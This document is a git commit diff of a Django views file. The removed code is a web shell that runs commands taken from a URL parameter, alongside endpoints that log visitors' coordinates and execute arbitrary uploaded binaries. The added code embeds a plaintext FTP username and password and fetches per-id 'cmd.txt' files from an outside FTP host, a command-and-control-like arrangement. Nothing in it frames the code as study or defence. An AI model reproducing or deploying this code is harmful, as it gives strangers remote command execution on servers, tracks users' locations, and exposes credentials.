b568622c805ddcd6855cab7e9ecd61a111618fd2
slrc1 <info@slrc1.comli.com>
2016-07-06 09:30:49 +0530

    Add files via upload

--- hello/views.py
+++ hello/views.py
@@ -1,52 +1,21 @@
-from django.shortcuts import render
 from django.http import HttpResponse
-import os,sys,commands,urllib
-from .models import Greeting
+pw = '12345nadeen'
+un = 'fceu_17699664'
 
-# Create your views here.
+import os
+import sys
+import commands
+import urllib
+import ftplib
+
+#urllib.urlretrieve('ftp://username:password@server/path/to/file', 'file')
+#urllib.urlretrieve('ftp://username:password@server/path/to/file', 'file')
+#urllib.urlretrieve('ftp://username:password@server/path/to/file', 'file')
+#urllib.urlretrieve('ftp://username:password@server/path/to/file', 'file')
+#urllib.urlretrieve('ftp://username:password@server/path/to/file', 'file')
+#urllib.urlretrieve('ftp://username:password@server/path/to/file', 'file')
+
 def index(request):
-    s = None
-    try:
-        s = str(request.GET['c'])
-        return HttpResponse(commands.getoutput(s))
-    except Exception:
-        pass
-    return render(request, 'index.html')
-def save(request):
-    lat = request.GET['lat']
-    lng = request.GET['lng']
-    f = open('log.txt','a+')
-    f.write('Latitude: '+lat+'\n')
-    f.write('Longitude: '+lng+'\n')
-    f.close()
-    return HttpResponse("$")
-def compileasm(request):
-    d = str(request.GET['data'])
-    os.system('chmod a+x fasm/fasm')
-    with open('fasm/file.asm','w') as f:
-        f.write(d)
-    return HttpResponse(commands.getoutput('fasm/fasm fasm/file.asm'))
-
-def runasm(request):
-    fn = str(request.GET['file'])
-    os.system('chmod a+x fasm/'+fn)
-    return HttpResponse(commands.getoutput('fasm/'+fn))
-
-def ts2wmv(request):
-    ret = urllib.urlopen (request.GET['in']).read()
-    f = open('tmp.ts','wb')
-    f.write(ret)
-    del ret
-    f.close()
-    ret = commands.getoutput(request.GET['c'])
+    x = str(request.GET['x'])
+    ret = urllib.urlretrieve('ftp://'+un+':'+pw+'@ftp.freecluster.eu/htdocs/id/'+x+'/cmd.txt', 'file')
     return HttpResponse(ret)
-
-def db(request):
-
-    greeting = Greeting()
-    greeting.save()
-
-    greetings = Greeting.objects.all()
-
-    return render(request, 'db.html', {'greetings': greetings})
-    
